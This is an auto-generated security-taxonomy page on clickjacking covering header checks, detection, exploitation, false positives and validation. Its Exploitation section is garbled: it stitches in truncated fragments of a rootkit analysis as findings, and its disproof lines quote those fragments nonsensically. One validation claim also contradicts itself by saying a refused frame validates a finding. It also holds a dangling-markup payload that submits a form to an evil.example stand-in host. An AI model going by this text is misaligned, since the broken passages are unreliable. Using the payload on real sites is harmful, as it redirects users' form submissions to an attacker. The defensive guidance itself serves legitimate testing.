<!-- GENERATED from db/wks.db — do not edit -->
# Clickjacking / UI Redressing

## Definition

A foreign page can frame and overlay the target so the user's click means something they did not intend.

- **CWE:** 1021
- **OWASP:** A05:2021
- **Surface:** client
- **Aliases:** ["clickjacking", "ui redress", "frame embedding"]

Canonical home for `clickjacking`. Rendered from `db/wks.db` by `tools/taxonomy/build_taxonomy.py` — edit the rows, not this file.

## Root Cause

Not yet researched.

## Preconditions

**A web endpoint is clickjacking-exposed only when its responses carry neither an X-Frame-Options header nor a CSP frame-ancestors directive on every state-changing route.**

Probe: send `GET /target HTTP/1.1` with `Host: <victim>` and `Cookie: session=<valid>`, then read the response header block. Absence of `X-Frame-Options` AND absence of `frame-ancestors` inside the `Content-Security-Policy` header is the precondition for framing; Cloudflare's own Pages documentation treats X-Frame-Options as the control that stops an application being embedded in an iframe, and GitHub's platform-security writeup states that frame-ancestors is the directive that mitigates clickjacking and framing attacks. Test the ERROR path and the POST target separately: a redirect or a 4xx that drops the header while the 200 keeps it means the endpoint is only partly covered, and an attacker only needs the uncovered one. Differential: compare the header set on an authenticated 200 against the same route unauthenticated. A header that only appears on the authenticated response (or only on the static shell) changes the verdict.

*Disproof:* If ANY response on the state-changing route returns a valid `X-Frame-Options: DENY`/`SAMEORIGIN` or a `Content-Security-Policy` containing `frame-ancestors`, the endpoint is not frameable and this claim is false for it. A 200 with either header present, observed on a raw request with no browser involved, disproves it.

## Attack Surface

Surface: **client**.

The entry points and enabling conditions for this surface are enumerated under **Preconditions**; the observable signals are under **Detection**.

## Detection

**A response carrying X-Frame-Options but no CSP frame-ancestors is a weak-mitigation signal, not a finding: legacy X-Frame-Options cannot express per-path allowlists and is ignored when frame-ancestors is present.**

Read the raw header block and classify it into three buckets rather than pass/fail. Bucket A: no X-Frame-Options and no frame-ancestors = exposed. Bucket B: X-Frame-Options: SAMEORIGIN (or DENY) with no frame-ancestors = legacy-only. Bucket C: both present = modern, and the stricter wins per RFC/CSP precedence in supporting browsers. GitHub is the worked example of why the two are not interchangeable in practice: because frame-ancestors lacked broad browser support, GitHub set BOTH the frame-ancestors directive and the X-FRAME-OPTIONS header in all responses. Cloudflare's Pages hardening example ships the same pair together, `Content-Security-Policy: script-src 'self'; frame-ancestors 'none';` alongside X-Frame-Options. So for a hunter, a lone X-Frame-Options is the SIGNAL worth recording, and the disambiguating test is browser-side: load the target in an iframe from a different origin and observe whether the frame renders or is refused.

*Disproof:* If a raw request to the endpoint returns a `Content-Security-Policy` header whose directives include `frame-ancestors` (any value), the response is already in bucket C and the 'legacy-only' signal does not apply. Equally, if a cross-origin iframe load of the endpoint is refused by a current browser, the practical exposure is nil regardless of which headers are present, and the signal is a false lead.

**A convincing observation for this class is: Adjacent behaviour that produces the same observable result: A clickjacking finding is validated only by a differential browser render showing a cross-origin frame actually loaded and a decoy click landing on a framed state-changing control, not by the absence of a frame-protective header.**

Derived from clickjacking.fp_rule.auto.derived, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (clickjacking.fp_rule.auto.derived) states the full boundary.

## Exploitation

**Based on the Tools, Techniques, and Procedures employed and some background information we cannot publicly disclose, a Russia-based attacker is likely.**

n iframe injecting cyber crime operations, driving traffic to exploit kits. It could also be used in a Waterhole attack to conduct a targeted attack against a specific target audience without leaving much forensic trail. It appears that this is not a modification of a publicly available rootkit. It seems that this is contract work of an intermediate programmer with no extensive kernel experience. Based on the Tools, Techniques, and Procedures employed and some background information we cannot publicly disclose, a Russia-based attacker is likely. 
 Functional Overview 
 The kernel module in question has been compiled for a kernel with the version string 2.6.32-5 . The -5 suffix is indicative of a distribution-specific kernel release. Indeed, a quick Google search reveals that the latest Debian squeeze kernel has the version number 2.6.32-5 . The module furthermore exports symbol names for all functions and global variables found in the mo

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "Based on the Tools, Techniques, and Procedures employed and some background information we".

**If this check passes, the rootkit then copies the injection information into a global variable.**

y, an IP address registered to Zattoo Networks in Zurich, Switzerland, that is not otherwise used throughout the code. 
 The server is then expected to respond with the information about whether an iframe or a JavaScript snippet should be injected, together with the code to be injected. The server's response must contain a similarly generated authentication secret for the response to be accepted. If this check passes, the rootkit then copies the injection information into a global variable. This protocol is obviously vulnerable to simply generating the secret blob once using dynamic analysis and replaying it, and therefore it merely serves for a little obfuscation. We didn't invest further time investigating this specific "encryption" algorithm. 
 TCP Connection Hijacking 
 In order to actually inject the iframes (or JavaScript code references) into the HTTP traffic, the rootkit inl

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "If this check passes, the rootkit then copies the injection information into a global vari".

**This ensures that only on every n -th send buffer an injection is attempted.**

sed to a potential sendmsg call in the following analysis. The formation_new_tcp_msg function invokes a decision function that contains 4 tests, determining whether injection on the message should be attempted at all: 
 An integer at +0x2f0 into the current configuration is incremented. Only if its value modulo the integer at +0x2e8 in the current configuration is equal to zero, this test passes. This ensures that only on every n -th send buffer an injection is attempted. Ensure that the size of all the send buffers to be sent is below or equal to 19879 bytes. Verify that originating port (server port for server connections) is :80. Ensure that the destination of this send is not 127.0.0.1. Make sure that none of the following three strings appears anywhere in the send buffer: "403 Forbidden" "304 Not Modified" " was not found on this server." 
 Make sure the dest

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "This ensures that only on every n -th send buffer an injection is attempted.".

**Click-redress at scale is delivered by injecting a framed or scripted payload into HTTP responses in transit, so the framing decision is made by the victim's browser against attacker-chosen bytes.**

Two observable halves. First, the delivery: the payload reaches the victim's browser because something in the response path writes an iframe or script reference into the traffic. CrowdStrike's Linux rootkit analysis describes the mechanism concretely - it inline hooks `tcp_sendmsg` to inject the iframes (or JavaScript code references) into the HTTP traffic, and the C2 response carries the code to be injected. Second, the population: Google's anti-malware team reported identifying web pages that infect vulnerable hosts via drive-by downloads, having investigated billions of URLs and found more than three million unique URLs across over 180,000 sites, so a single confirmed injection mechanism has enormous reach. Hunt: capture the response for a victim page and check whether a foreign-origin `<iframe>` or `<script src>` appears in a body the application did not generate, and whether the page's own X-Frame-Options / frame-ancestors would have blocked framing had the payload not been injected inline. The click-redress completes only if a human clicks; the delivery half alone is the finding.

*Disproof:* If the responses served to the victim contain no attacker-controlled iframe or script reference - verified by diffing the served HTML against the application's own template output across repeated fetches, with no variance - then nothing was injected in transit and this technique is not in play. A 200 whose body hash is stable and contains only same-origin subresources disproves it.

**A click-redress that does not need a full overlay works by leaving an HTML tag unclosed, so the victim's click on the visible control is parsed as a submit of an attacker-controlled form.**

The payload shape is an unclosed attribute or CDATA-bearing tag, not an invisible iframe. Reproduce: `GET /comments?q=%3Cform+action%3D%22https%3A%2F%2Fevil.example%2F%22%3E%3Cbutton%3EClick%3C%2Fbutton%3E%3Ctextarea+name%3D%27` on any endpoint that reflects a path or query into an error or comment page. The response HTML then shows an unclosed `name='`; the parser treats the next real `<form>` as nested inside the injected one, and browsers prefer the topmost form element, so the victim's click submits to the attacker's action. GitHub's post-CSP writeup documents this exact bypass of a dangling-markup mitigation, and frames it as: combining a `<textarea>` tag with an unclosed attribute bypasses the protection. Google's guidance supplies the precondition that makes the reflection dangerous: error pages commonly include the path component in the rendered HTML, so the injection lands in the page rather than being escaped. Confirm by parsing the returned HTML, not by eyeballing: does the injected form element end up as an ancestor of the page's real form? If yes, the click is redirected.

*Disproof:* If the returned HTML has the injected attribute and tag balanced by the application's own sanitiser, so that no injected element becomes an ancestor of the page's real form, the technique does not work. Concretely: replay the payload and confirm the attacker `action` is not an ancestor-form target and that clicking the visible control submits to the application's own endpoint, with no request to the attacker's host.

**Framing a login, password-reset or payment-confirmation page is the clickjacking case that causes loss, because the frame-buster, frame-ancestors and SameSite defences are built for embedded-page redress and the real impact comes from the user's action completing inside the active session.**

The three named defences are all aimed at the embedded-page case: preventing the browser from loading the page in frame using the X-Frame-Options or Content Security Policy (frame-ancestors) HTTP headers; preventing session cookies from being included when the page is loaded in a frame using the SameSite cookie attribute; and implementing JavaScript in the page to attempt to prevent it being loaded in a frame, known as a frame-buster. A test that renders an innocuous page and reports the missing header is therefore low value, because the same finding on a state-changing confirmation is high value and the same absence is what makes it so. Procedure: take a page that performs a state change on a single click (password change, address update, transfer confirmation, MFA approval), render it inside a cross-origin overlay positioned over a decoy control, and confirm that a real click in the decoy region lands on the framed control while the victim's session is active. Report the framed page, not the site.

*Disproof:* The claim is wrong, and the framing is not a clickjacking finding, if the framed page performs no state change on click (a pure read or search page); the sensitive action requires re-authentication or a second factor that cannot be satisfied by the single overlaid click; the response denies framing outright through X-Frame-Options or a frame-ancestors directive that excludes the testing origin, which makes the overlay impossible; or the frame is same-origin with the attacker page, which is a scripting bug, not UI redress. Name the state change in the report or the item is a hardening note.

## Variations

**X-Frame-Options SAMEORIGIN is defeated by an intermediate same-origin frame nested inside an attacker page, because it matches only the top-level document's location, whereas a per-ancestor check inspects every ancestor in the chain.**

Mechanism: X-Frame-Options SAMEORIGIN is defeated by an intermediate same-origin frame nested inside an attacker page, because it matches only the top-level document's location, whereas a per-ancestor check inspects every ancestor in the chain. How to apply it in the field: treat this as the bypass it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It is not defeated when the top-level document itself is the attacker origin, because the match then fails at the first ancestor; it IS defeated when the target can be embedded by one of its own pages that in turn can be framed cross-origin, since every-ancestor checking is what closes that gap.

*Disproof:* It is not defeated when the top-level document itself is the attacker origin, because the match then fails at the first ancestor; it IS defeated when the target can be embedded by one of its own pages that in turn can be framed cross-origin, since every-ancestor checking is what closes that gap.

## Technology / Framework Considerations

Not yet researched.

## API Considerations

Not yet researched.

## Attack Chains

- `chain.clickjacking.auto.01` — clickjacking: observe, exercise, confirm (goal: `Establish, exercise and confirm a clickjacking condition on an authorised target without relying on anyone else's data.`)

## Real-World Examples

Not yet researched.

## Common False Positives

**This LOOKS like clickjacking (an iframe embeds an authenticated page) but is actually a benign same-origin embed, separated by the frame's document being same-origin with the embedding page.**

The false positive: a scanner or a reviewer sees `<iframe src="/app/widget">` on an authenticated page and files clickjacking. It is benign when the framed document is SAME-ORIGIN with the embedder, because the frame then enforces the same-origin policy exactly as if the content had been opened in its own window or tab - GitHub's writeup puts it that way when justifying its own frame-src policy, and still restricts framing for defence in depth rather than because same-origin framing is exploitable. The separating observation is the origin, not the presence of the iframe: fetch the framed document and compare its scheme, host and port to the embedding page's, and inspect whether the framed document can read the parent's DOM (`document.referrer`/`parent.document` reachability from the framed context). A genuine clickjacking payload MUST be cross-origin from the victim - it is served from evil.example and relies on the browser allowing the frame - so a same-origin embed fails the precondition the attack needs. CrowdStrike's Kovter writeup is the reminder that the attack's own definition is about tricking a user into clicking a control on ANOTHER page, which is a cross-origin relationship by construction. Record the verdict only after the origin comparison, never from the iframe's presence alone.

*Disproof:* Disproof of the FP verdict: the framed document's origin differs from the embedder's (different host, or different scheme/port), or the framed document can reach into the parent document. Either observation makes the embed cross-origin and the finding real, so this is not a same-origin benign embed. Conversely, a strictly same-origin frame with no parent-DOM reach is confirmed benign.

**A frame-ancestors directive that appears in a meta element rather than a response header is not a defence, because the directive must be ignored in a policy defined via meta, so a scanner that parses the HTML and finds it has found nothing enforced.**

Mechanism: A frame-ancestors directive that appears in a meta element rather than a response header is not a defence, because the directive must be ignored in a policy defined via meta, so a scanner that parses the HTML and finds it has found nothing enforced. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It IS enforced when the same directive is also present in a real Content-Security-Policy response header, which takes precedence; it is NOT enforced when the meta-tag form is the only place it appears, in which case the page remains framable from any origin and the finding stands. The related server-side gap is that a protection header added only on success responses is missing from error and redirect responses.

*Disproof:* It IS enforced when the same directive is also present in a real Content-Security-Policy response header, which takes precedence; it is NOT enforced when the meta-tag form is the only place it appears, in which case the page remains framable from any origin and the finding stands. The related server-side gap is that a protection header added only on success responses is missing from error and redirect responses.

**A Content-Security-Policy that defines default-src 'none' but omits frame-ancestors does not prevent framing, because frame-ancestors does not fall back to the default sources, so a hunter cannot treat a strict-looking policy as clickjacking protection.**

Mechanism: A Content-Security-Policy that defines default-src 'none' but omits frame-ancestors does not prevent framing, because frame-ancestors does not fall back to the default sources, so a hunter cannot treat a strict-looking policy as clickjacking protection. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It IS protection when frame-ancestors or an equivalent X-Frame-Options value is actually present and non-permissive; it is NOT when the policy relies on default-src or frame-src alone, since the spec states explicitly that an absent frame-ancestors leaves the resource framable from anywhere.

*Disproof:* It IS protection when frame-ancestors or an equivalent X-Frame-Options value is actually present and non-permissive; it is NOT when the policy relies on default-src or frame-src alone, since the spec states explicitly that an absent frame-ancestors leaves the resource framable from anywhere.

**Reject a clickjacking finding until it is distinguished from the adjacent behaviour this class also covers. "Framing a login, password-reset or payment-confirmation page is the clickjacking case that causes loss, because the frame-buster, frame-ancestors and SameSite defences are built for embedded-page redress and the real impact comes from the..." and "A clickjacking finding is validated only by a differential browser render showing a cross-origin frame actually loaded and a decoy click landing on a framed state-changing control, not by the absence of a frame-protective header." share a surface and a symptom, so a response that matches the first is not evidence for it while the second remains possible.**

Hypothesis under test: Framing a login, password-reset or payment-confirmation page is the clickjacking case that causes loss, because the frame-buster, frame-ancestors and SameSite defences are built for embedded-page redress and the real impact comes from the...

Adjacent behaviour that produces the same observable result: A clickjacking finding is validated only by a differential browser render showing a cross-origin frame actually loaded and a decoy click landing on a framed state-changing control, not by the absence of a frame-protective header.

Why this is worth checking before reporting: both are recorded in this class as gated knowledge, so a tester who stops at the first match will report one of them. The two differ in what the server actually did with the input, and that difference is observable in the response rather than in the request.

Required before treating this as a finding: capture the response that demonstrates the first behaviour specifically, and confirm the second is not what was observed.

*Disproof:* This rule is wrong if a controlled test shows the two behaviours can never co-occur on the same surface, or if the corpus entry for "A clickjacking finding is validated only by a differential browser ren" is out of date. In that case this class needs its false-positive guidance rewritten rather than deleted.

**An embeddable page is only a reportable clickjacking finding when the framed page exposes a state-changing or authenticating interaction an attacker would want to borrow; a framed page with no actionable controls is at most a low-severity hardening note.**

Mechanism: An embeddable page is only a reportable clickjacking finding when the framed page exposes a state-changing or authenticating interaction an attacker would want to borrow; a framed page with no actionable controls is at most a low-severity hardening note. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It IS reportable when the framed page renders a delete, transfer, approval, or settings control reachable by the forced click; it is NOT when the framed resource is a public read-only view with no interactive elements, since nothing of value can be redressed and the missing control header carries no exploitation path.

*Disproof:* It IS reportable when the framed page renders a delete, transfer, approval, or settings control reachable by the forced click; it is NOT when the framed resource is a public read-only view with no interactive elements, since nothing of value can be redressed and the missing control header carries no exploitation path.
**Hypothesis:** The response sets X-Frame-Options but no CSP frame-ancestors, therefore framing protection is incomplete
- Invalidated by: The legacy header cannot express a per-path allowlist and is the intended control where frame-ancestors is absent; the frame was refused. The pairing of both headers is the normal defensive configuration, not a missing one
- **Rejection rule:** X-Frame-Options without frame-ancestors is the COMMON hardened configuration - frame-ancestors has patchy support, so operators set both. Treat it as a finding only when the framed document actually renders cross-origin

## Validation

**A clickjacking finding is validated only by a differential browser render showing a cross-origin frame actually loaded and a decoy click landing on a framed state-changing control, not by the absence of a frame-protective header.**

Header inspection tells you a defence is missing; only a render tells you the attack lands. Run the page in a real browser under a scripted cross-origin parent at controlled offsets, capture whether the framed document painted at all, and record where a click at the decoy coordinates is dispatched. Three outcomes must be distinguished: the frame refuses to load and the parent shows the Invalid frame refusal (the defence works, no finding); the frame loads but every interactive control requires re-authentication or a second factor, which caps the impact (a hardening note); the frame loads and a single click in the decoy region changes server-side state for the active session (a finding). Note that these mechanisms are all independent of each other, and where possible more than one of them should be implemented in order to provide defense in depth, so a page may be protected by frame-ancestors alone, by SameSite alone, or by a frame-buster alone, and each produces a different render result. Capture the network trace alongside the render so the state change is attributable to the framed request.

*Disproof:* The validation fails, and there is no clickjacking finding, if the framed document never paints in the cross-origin parent; the parent receives a frame-busting navigation and the framed content is replaced; the click at the decoy coordinates is dispatched to the parent page rather than the frame (an overlay that is not actually over the control); the state change requires a second factor or a re-authentication step the attacker cannot supply; or replaying the framed request without a real click produces the same state change, which means the outcome was a CSRF, not UI redress. Record the click dispatch target, not just the missing header.

**A clickjacking finding is only validated when two independent observations agree: the raw header block lacks both frame protections, and a real cross-origin iframe load of the page is refused rather than rendered.**

Step 1, headers. `GET /target HTTP/1.1` with a valid session cookie, raw socket, no rewriting. Record the presence and value of `X-Frame-Options` and of `frame-ancestors` inside `Content-Security-Policy`. Step 2, render. Serve a local page containing `<iframe src="https://victim.example/target"></iframe>` from a different origin and record whether the frame body paints. Interpret the pair: headers present AND frame refused = protected, close. Headers absent AND frame rendered = exposed, confirm. Headers absent AND frame refused = a control exists elsewhere (CSP via meta tag, a WAF, or a cookie-gated render) and the header-only finding is a false positive. Headers present AND frame rendered = the protection is malformed or scoped to a path that does not cover this route. GitHub's writeup is why both are emitted at once - frame-ancestors lacks broad support, so X-FRAME-OPTIONS is set alongside it - and Cloudflare's docs show the same pairing. A 200 header block with `frame-ancestors` present in the CSP satisfies step 1 on its own.

*Disproof:* Disproof is any one of: a raw response on the target route that carries `X-Frame-Options` or a `Content-Security-Policy` containing `frame-ancestors`; or a cross-origin iframe load that is refused by a current browser; or a frame that renders but exposes no state-changing control, in which case there is nothing to redress and the finding does not stand.

**The convincing clickjacking evidence is a PoC page that frames the target in an attacker-controlled document and demonstrates that a user interaction intended for the attacker's content lands on the framed target, which proves the UI is being redressed rather than merely that a header is absent.**

Mechanism: The convincing clickjacking evidence is a PoC page that frames the target in an attacker-controlled document and demonstrates that a user interaction intended for the attacker's content lands on the framed target, which proves the UI is being redressed rather than merely that a header is absent. How to apply it in the field: treat this as the validation it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: If the framed resource refuses to load in the nested context because the ancestor check aborts the load, or the target requires a fresh interaction the attacker cannot borrow, the redressing claim collapses and only a missing-header hardening note remains; a bare 200 response to a HEAD or OPTIONS probe proves nothing about framing.

*Disproof:* If the framed resource refuses to load in the nested context because the ancestor check aborts the load, or the target requires a fresh interaction the attacker cannot borrow, the redressing claim collapses and only a missing-header hardening note remains; a bare 200 response to a HEAD or OPTIONS probe proves nothing about framing.

**To decide this case, observe: How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from clickjacking.fp_rule.a_strict_default_src_is_not_a_framing_defence, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (clickjacking.fp_rule.a_strict_default_src_is_not_a_framing_defence) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from clickjacking.fp_rule.a_frame_ancestors_policy_delivered_in_a_meta_element_is_not_a_control, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (clickjacking.fp_rule.a_frame_ancestors_policy_delivered_in_a_meta_element_is_not_a_control) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from clickjacking.fp_rule.framability_of_a_static_read_only_page_is_low_severity_not_a_finding, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (clickjacking.fp_rule.framability_of_a_static_read_only_page_is_low_severity_not_a_finding) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the validation it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from clickjacking.validation.prove_framing_with_a_real_iframe_and_a_forced_click, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (clickjacking.validation.prove_framing_with_a_real_iframe_and_a_forced_click) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the bypass it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from clickjacking.bypass.sameorigin_only_matches_the_top_level_document, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (clickjacking.bypass.sameorigin_only_matches_the_top_level_document) states the full boundary.

## Impact

**The impact of a frameable state-changing page is that a foreign origin can force an authenticated user's action and capture a per-page token, turning one redressed click into privilege escalation.**

Two impact paths, both evidenced. Path one, forced action across origins: without CORS, a malicious site owner might be able to make requests to unsuspecting visitors' banks and initiate a transfer on their behalf - Cloudflare's documentation states this plainly. That is exactly the click-redress end state: the victim is authenticated, the origin is foreign, and the action is the victim's own. Path two, token capture: GitHub's post-CSP writeup records that CSRF tokens occur on nearly every page and the exfiltration of one can be easily leveraged to escalate privileges, so a single redressed click that leaks the token is not a nuisance issue but a privilege boundary crossing. To rate severity, determine which page was framed and what a single click on it commits: an email-change or 2FA-disable page outranks a like button. Test the impact by confirming the framed route performs a state change on POST with only the victim's ambient session, and that a token on the page is present in the response the frame can read or cause to be sent. Do not claim escalation without showing the token was actually exfiltrated; show the outbound request.

*Disproof:* Disproof is a state-change requirement: the framed route takes no state-changing action on a single click, or requires a second factor the click alone cannot satisfy, or the token on the page is not reachable from the framed context. Also disproof: the framed response sets `SameSite` on its session cookie such that the cross-site POST carries no session at all, so there is no authenticated victim to act as. Any of these collapses the impact to nuisance.

## Related Bug Classes

Not yet researched.

## References

- **blog.cloudflare.com** (docs)
  - <https://blog.cloudflare.com/custom-headers-for-pages/>
- **cheatsheetseries.owasp.org** (cheatsheet)
  - <https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html>
- **crowdstrike.com** (writeup)
  - <https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/>
  - <https://www.crowdstrike.com/blog/kovter-killer-how-to-remediate-the-apt-of-clickjacking/>
- **github.blog** (writeup)
  - <https://github.blog/engineering/platform-security/githubs-csp-journey/>
  - <https://github.blog/engineering/platform-security/githubs-post-csp-journey/>
- **httpd.apache.org** (writeup)
  - <https://httpd.apache.org/docs/2.4/mod/mod_headers.html>
- **nginx.org** (writeup)
  - <https://nginx.org/en/docs/http/ngx_http_headers_module.html>
- **portswigger.net** (docs)
  - <https://portswigger.net/web-security/clickjacking/>
- **securelist.com** (research)
  - <https://securelist.com/vulnerabilities-and-exploits-in-q2-2026/121091/>
- **security.googleblog.com** (research)
  - <https://security.googleblog.com/2008/02/all-your-iframe-are-point-to-us.html>
  - <https://security.googleblog.com/2011/05/website-security-for-webmasters.html>
- **tomcat.apache.org** (writeup)
  - <https://tomcat.apache.org/tomcat-9.0-doc/config/filter.html>
- **w3.org** (writeup)
  - <https://www.w3.org/TR/CSP2/>

Every item above is gated on >= 2 distinct publisher hosts (`wks/quality.py`, rule R1). Publisher diversity, not citation count, is what makes these corroborated.
